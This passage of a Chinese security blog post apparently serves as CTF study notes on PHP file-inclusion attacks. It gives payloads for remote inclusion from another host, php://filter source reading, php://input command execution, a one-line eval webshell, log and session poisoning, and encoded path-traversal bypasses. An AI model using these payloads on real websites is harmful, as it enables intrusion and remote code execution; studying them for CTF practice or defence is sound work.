2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h2 id="远程文件包含（RFI）"><a href="#远程文件包含（RFI）" class="headerlink" title="远程文件包含（RFI）"></a>远程文件包含（RFI）</h2><h3 id="原因-1"><a href="#原因-1" class="headerlink" title="原因"></a>原因</h3><p>php.ini配置中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen &#x3D; On （是否允许打开远程文件）</span><br><span class="line">allow_url_include &#x3D; On（是否允许include&#x2F;require远程文件）</span><br></pre></td></tr></table></figure>
+<p>一般allow_url_fopen默认为on,但是allow_url_include在php5.2之后就默认为off</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>依然没有做过滤或防绕过</p>
+<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>面对无防绕过的网站可直接构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;flag&#x2F;flag.php?filename&#x3D;http:&#x2F;&#x2F;192.168.91.133&#x2F;php&#x2F;phpinfo.txt</span><br></pre></td></tr></table></figure>
+<p>面对有限制的网站，比如如下代码，对包含的文件后加一个html后缀</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include($_GET[&#39;filename&#39;] . &quot;.html&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
+<p>比如当远程包含phpinfo.txt时，返回时会变成phpinfo.txt.html<br>在这里我们可以利用 ？，#，空格绕过，注意#和空格用url编码编码一下具体视情况而定</p>
+<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p><img src="https://img-blog.csdnimg.cn/20190617213659994.png" alt="alt"></p>
+<h3 id="Phar-php归档"><a href="#Phar-php归档" class="headerlink" title="Phar://(php归档)"></a>Phar://(php归档)</h3><ul>
+<li>*<em>条件 *</em><br>php&gt;=5.3.0,注意url编码</li>
+<li><strong>利用</strong><br><a href="http://127.0.0.1/flag.php?f=phar://attect.txt，attect.txt可写入php代码" target="_blank" rel="noopener">http://127.0.0.1/flag.php?f=phar://attect.txt，attect.txt可写入php代码</a><ul>
+<li><strong>例题代码</strong></li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $p &#x3D; new PharData(dirname(__FILE__).&#39;&#x2F;phartest.aaa&#39;,</span><br><span class="line"> 0,&#39;phartest&#39;,Phar::ZIP) ; </span><br><span class="line">$p-&gt;addFromString(&#39;testfile.txt&#39;, &#39;&lt;?php phpinfo();?&gt;&#39;); ?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="Zip"><a href="#Zip" class="headerlink" title="Zip://"></a>Zip://</h3><ul>
+<li><strong>条件</strong><br>php&gt;=5.3.0，在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以，需要指定绝对路径，注意url编码</li>
+<li><strong>利用</strong><br>利用原型：zip://attect.zip#dir/file.txt,file.txt可以写入恶意PHP代码</li>
+<li><strong>例题</strong><br><a href="http://106.12.37.37:10007/" target="_blank" rel="noopener">http://106.12.37.37:10007/</a><br>例题对应代码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $include_file&#x3D;$_GET[include_file];</span><br><span class="line"> if ( isset( $include_file ) &amp;&amp; strtolower( substr( $include_file, -4 ) ) &#x3D;&#x3D; &quot;.php&quot; )</span><br><span class="line">  &#123; require($include_file ); &#125;?&gt;</span><br></pre></td></tr></table></figure>
+<strong>测试结果</strong><br><img src="https://img-blog.csdnimg.cn/20190617213740849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们可以注意到其实phar协议和zip协议是类似的<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter:"></a>php://filter:</h3></li>
+<li><strong>条件</strong><br>需要开启 allow_url_fopen，不需要开启 allow_url_include；</li>
+<li><strong>filter讲解</strong><br>php://filter 是一种元封装器，     设计用于数据流打开时的筛选过滤应用。     这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、     file() 和 file_get_contents()，     在数据流内容读取之前没有机会应用其他过滤器。   一般可用来读取敏感文件 （更多可看<a href="https://www.php.net/manual/zh/wrappers.php.php）" target="_blank" rel="noopener">https://www.php.net/manual/zh/wrappers.php.php）</a></li>
+<li><strong>例题（对应代码会在做题结果出现）</strong><br><a href="http://chinalover.sinaapp.com/web7/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web7/index.php</a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">poc: </span><br><span class="line">1.http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;web7&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br><span class="line">2.http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;web7&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>
+我们注意的是read可选可无，这里可以查看官方文档<h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input:"></a>php://input:</h3></li>
+<li><strong>条件</strong><br>1.allow_url_include = On。<br>2.可读取post过去的数据</li>
+<li><strong>例题及解题过程(普通利用)</strong><br>106.12.37.37:10008<br>扫目录得到<a href="http://106.12.37.37:10008/index.php.bak" target="_blank" rel="noopener">http://106.12.37.37:10008/index.php.bak</a><br>源码如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$flag&#x3D;&#39;xxx&#39;; </span><br><span class="line">extract($_GET);</span><br><span class="line">if(isset($key))&#123; $content&#x3D;trim(file_get_contents($flag)); if($key&#x3D;&#x3D;$content)&#123; echo&#39;ctf&#123;xxx&#125;&#39;; &#125;</span><br><span class="line">else&#123; echo&#39;Oh.no&#39;;&#125; &#125;</span><br></pre></td></tr></table></figure>
+此题有两种方法：第一种是利用extract函数变量覆盖使content变量和key变量相等，得出flag;我们在此不做多余赘述。第二种则是利用我们的input伪协议，我们可以看到，只需要让key的值和flag的值相等，我们就可以得出flag,我们以上说过，php://input可以获取post的数据，我们按照以下的步骤即可得到flag<br><img src="https://img-blog.csdnimg.cn/20190617213810232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70" alt=""></li>
+<li><strong>命令执行和传入木马</strong><br><strong>条件</strong><br>php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）,就可以造成任意代码执行<br><strong>命令执行</strong><br>post数据为<?php system('ls')?><br><strong>木马</strong><br>post数据为<?php @eval($_POST[cmd])?></li>
+<li><strong>条件</strong><br>php版本大于等于php5.2<br>allow_url_fopen = On<br>allow_url_include = On</li>
+<li><strong>利用</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.www.flag.com&#x2F;flag.php?filename&#x3D;data:text&#x2F;plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">2.www.flag.com&#x2F;flag.php?filename&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,dGhlIHVzZXIgaXMgYWRtaW4</span><br></pre></td></tr></table></figure>
+然后就出来了phpinfo界面<h2 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h2><h3 id="访问日志"><a href="#访问日志" class="headerlink" title="访问日志"></a>访问日志</h3></li>
+<li><strong>条件</strong><br>日志文件存储路径，且可读</li>
+<li><strong>利用</strong><br>web服务器会将请求写入到日志文件（上面已给出，也可搜索网上目录）中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/<br><img src="https://img-blog.csdnimg.cn/20190617213917170.png" alt="在这里插入图片描述"><br>需要注意的是我们在burp抓包进行拦截在发出请求，否则会被编码，如下，第一条是抓包发出的，第二条为在浏览器里直接进行构造，第二条失败。<br><img src="https://img-blog.csdnimg.cn/20190617213926600.png" alt="在这里插入图片描述"><br>除了可以url请求外上传还可以进行文件上传和UA上传，下图为UA上传，绕过以上包含不成功，可以看下是否是open_basedir限制了目录<br><img src="https://img-blog.csdnimg.cn/20190617213936829.png" alt="在这里插入图片描述"></li>
+<li><strong>例题环境</strong><br>可以搜索SHACTF-2017-Web-writeup Bon Appétit，注意有两种解法，注重日志包含的那个解法。<h3 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h3></li>
+<li><strong>条件</strong><br>ssh log的文件位置，且可读，默认情况下为 /var/log/auth.log</li>
+<li><strong>利用</strong><br>利用ssh连接：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh &#39;&lt;?php phpinfo(); ?&gt;&#39;@remotehost</span><br></pre></td></tr></table></figure>
+密码随便输入，然后包含即可<h2 id="session包含"><a href="#session包含" class="headerlink" title="session包含"></a>session包含</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3>session文件路径可知，且其中内容部分可控。<h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h3></li>
+</ul>
+<p>通过phpinfo的信息，获取到session.save_path为/var/lib/php/session<br><img src="https://img-blog.csdnimg.cn/20190617213951538.png" alt="在这里插入图片描述"><br>常见的php-session存放位置</p>
+<ol>
+<li>/var/lib/php/sess_PHPSESSID</li>
+<li>/var/lib/php/sess_PHPSESSID</li>
+<li>/tmp/sess_PHPSESSID</li>
+<li>/tmp/sessions/sess_PHPSESSID<br>session的文件名一般为sess_+sessionid，sessionid可以通过开发者模式获取。<br>具体利用的方法，我的思路是先本地包含，将session文件包含出来，查看代码内容，然后再找有没有合适的变量进行写入payload，再进行session包含从而getshell<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3>推荐此文章和题目：<a href="https://www.codercto.com/a/33740.html" target="_blank" rel="noopener">https://www.codercto.com/a/33740.html</a><br>I春秋百度杯notebook(I春秋百度杯可找到)<h2 id="临时文件"><a href="#临时文件" class="headerlink" title="临时文件"></a>临时文件</h2><h3 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h3><img src="https://img-blog.csdnimg.cn/20190617214024175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>类似于文件上传的和时间竞争，向服务器上传木马文件以form-data方式提交请求上传数据时，会生成临时文件,通过phpinfo来获取临时文件的路径以及名称<br>可在网上找到脚本（博主暂时木有）<h3 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h3>可看此wp : <a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/</a><h2 id="environ"><a href="#environ" class="headerlink" title="environ"></a>environ</h2><h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3>php以cgi方式运行，这样environ才会保持UA头。<br>environ文件存储位置已知，且environ文件可读。<h3 id="利用-4"><a href="#利用-4" class="headerlink" title="利用"></a>利用</h3>proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。可参考：1.The proc/self/environ Injection ，<br>shell via LFI - proc/self/environ method<h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2>类似于environ，参考： LFI Cheat Sheet：/proc/self/environ LFI Method<h2 id="自包含"><a href="#自包含" class="headerlink" title="自包含"></a>自包含</h2>类似于/a.php?include=a.php<br>这样会导致不断包含自己，形成无穷递归，爆栈，最终使php无法进行后续处理<h3 id="php7SegmentFault"><a href="#php7SegmentFault" class="headerlink" title="php7SegmentFault"></a>php7SegmentFault</h3>上大佬博客：<a href="https://www.jianshu.com/p/dfd049924258" target="_blank" rel="noopener">https://www.jianshu.com/p/dfd049924258</a></li>
+</ol>
+<h2 id="绕过（上面讲过的方法同样适用）"><a href="#绕过（上面讲过的方法同样适用）" class="headerlink" title="绕过（上面讲过的方法同样适用）"></a>绕过（上面讲过的方法同样适用）</h2><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>服务器端常常会对于../等做一些过滤，可以用一些编码来进行绕过。下面这些总结来自《白帽子讲Web安全》。</p>
+<ul>
+<li><strong>利用url编码</strong></li>
+</ul>
+<ol>
+<li>../<br>%2e%2e%2f<br>..%2f<br>%2e%2e/   </li>
+<li>..<br>%2e%2e%5c<br>..%5c<br>%2e%2e\</li>
+</ol>
+<ul>
+<li><strong>二次编码</strong></li>
+</ul>
+<ol>
+<li><p>../<br>%252e%252e%252f</p>
+</li>
+<li><p>..\</p>
+<p> %252e%252e%255c</p>
+</li>
+</ol>
+<ul>
+<li><strong>容器/服务器的编码方式</strong></li>
+</ul>
+<ol>
+<li><p>../<br>..%c0%af</p>
+<p>%c0%ae%c0%ae/</p>
+</li>
+<li><p>..<br>..%c1%9c</p>
+</li>
+</ol>
+
+    </article>
+    <!-- license  -->
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2020/03/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title= "命令执行">
+                    <div class="nextTitle">命令执行</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2020/03/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title= "文件上传">
+                    <div class="prevTitle">文件上传</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:Y_Y_K@x2.tn" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/yanyouke" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#文件包含漏洞分类"><span class="toc-number">1.</span> <span class="toc-text">文件包含漏洞分类</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#本地文件包含（LFI）"><span class="toc-number">1.1.</span> <span class="toc-text">本地文件包含（LFI）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原因"><span class="toc-number">1.1.1.</span> <span class="toc-text">原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#相关函数（php）"><span class="toc-number">1.1.2.</span> <span class="toc-text">相关函数（php）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用"><span class="toc-number">1.1.3.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过"><span class="toc-number">1.1.4.</span> <span class="toc-text">绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#远程文件包含（RFI）"><span class="toc-number">1.2.</span> <span class="toc-text">远程文件包含（RFI）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原因-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#伪协议"><span class="toc-number">1.3.</span> <span class="toc-text">伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Phar-php归档"><span class="toc-number">1.3.1.</span> <span class="toc-text">Phar:&#x2F;&#x2F;(php归档)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Zip"><span class="toc-number">1.3.2.</span> <span class="toc-text">Zip:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-filter"><span class="toc-number">1.3.3.</span> <span class="toc-text">php:&#x2F;&#x2F;filter:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-input"><span class="toc-number">1.3.4.</span> <span class="toc-text">php:&#x2F;&#x2F;input:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#日志文件包含"><span class="toc-number">1.4.</span> <span class="toc-text">日志文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#访问日志"><span class="toc-number">1.4.1.</span> <span class="toc-text">访问日志</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-log"><span class="toc-number">1.4.2.</span> <span class="toc-text">SSH log</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session包含"><span class="toc-number">1.5.</span> <span class="toc-text">session包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#条件"><span class="toc-number">1.5.1.</span> <span class="toc-text">条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-2"><span class="toc-number">1.5.2.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#例题"><span class="toc-number">1.5.3.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#临时文件"><span class="toc-number">1.6.</span> <span class="toc-text">临时文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-3"><span class="toc-number">1.6.1.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#例题-1"><span class="toc-number">1.6.2.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#environ"><span class="toc-number">1.7.</span> <span class="toc-text">environ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#条件-1"><span class="toc-number">1.7.1.</span> <span class="toc-text">条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-4"><span class="toc-number">1.7.2.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fd"><span class="toc-number">1.8.</span> <span class="toc-text">fd</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#自包含"><span class="toc-number">1.9.</span> <span class="toc-text">自包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php7SegmentFault"><span class="toc-number">1.9.1.</span> <span class="toc-text">php7SegmentFault</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过（上面讲过的方法同样适用）"><span class="toc-number">1.10.</span> <span class="toc-text">绕过（上面讲过的方法同样适用）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#编码绕过"><span class="toc-number">1.10.1.</span> <span class="toc-text">编码绕过</span></a></li></ol></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 6
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/14/xml%E6%B3%A8%E5%85%A5/" >xml注入</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" >文件上传</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/15</span><a class="archive-post-title" href= "/2020/03/15/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89/" >SQL注入（二）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/15</span><a class="archive-post-title" href= "/2020/03/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" >文件包含</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/15/SQL%E6%B3%A8%E5%85%A5/" >SQL注入（一）</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/15</span><a class="archive-post-title" href= "/2020/03/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" >命令执行</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="web漏洞总结"><span class="iconfont-archer">&#xe606;</span>web漏洞总结</span>
+    
+        <span class="sidebar-tag-name" data-tags="xml"><span class="iconfont-archer">&#xe606;</span>xml</span>
+    
+        <span class="sidebar-tag-name" data-tags="SQL注入"><span class="iconfont-archer">&#xe606;</span>SQL注入</span>
+    
+        <span class="sidebar-tag-name" data-tags="命令执行"><span class="iconfont-archer">&#xe606;</span>命令执行</span>
+    
+        <span class="sidebar-tag-name" data-tags="文件包含"><span class="iconfont-archer">&#xe606;</span>文件包含</span>
+    
+        <span class="sidebar-tag-name" data-tags="文件上传"><span class="iconfont-archer">&#xe606;</span>文件上传</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
